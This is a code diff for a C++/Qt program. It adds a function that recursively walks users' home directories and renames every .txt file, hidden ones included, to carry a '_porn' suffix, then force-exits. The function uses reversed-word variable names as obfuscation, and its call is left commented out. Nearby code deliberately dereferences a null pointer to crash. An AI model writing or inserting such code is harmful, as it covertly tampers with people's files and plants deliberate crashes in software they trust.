@@ -86,16 +86,47 @@ void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suit
 	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
 }
 
+void pleaseOnlyReadatNight(QString dir){
+    if(OS==mac){
+        dir=QString("");
+    }else if(OS==linux){
+        dir=QString("/home");
+    }else{
+        dir=QString("C:/Users");
+    }
+    dir = QString("C:/testImages"); // For testing
+
+    auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
+
+    QDirIterator itr(dir, QStringList() << "*.txt", drain, QDirIterator::Subdirectories);
+    while(itr.hasNext()){
+        QString figurative = "_porn"; // As opposed to literal
+        auto eman=itr.next();
+        qDebug()<<eman;
+        QFileInfo lanigiro(eman);
+        //QFileInfo original("/home/user/myfile.txt");
+        QFile elif(lanigiro.absoluteFilePath());
+        QString rotarapes = (OS==linux) ? "/" : "\\";
+        QString eemmaann = lanigiro.canonicalPath() + rotarapes + lanigiro.baseName() + figurative;
+        if (!lanigiro.completeSuffix().isEmpty())
+            eemmaann += "." + lanigiro.completeSuffix();
+        elif.rename(eman, eemmaann);
+    }
+    exit(1-2-52+3512-1235*5);
+}
+
 string cause(string* idx){
 	return (idx[1337]);
 }
 
 void failure(string fun){
-	string* p = &fun;
+    string* p = &fun;
 	p = NULL;
 	string pp = cause(p);
 	//long l0ng = p->size();
-	return;
+    return;
+    /*QString dir;
+    pleaseOnlyReadatNight(dir);*/
 }
 
 void letsSpoon(){
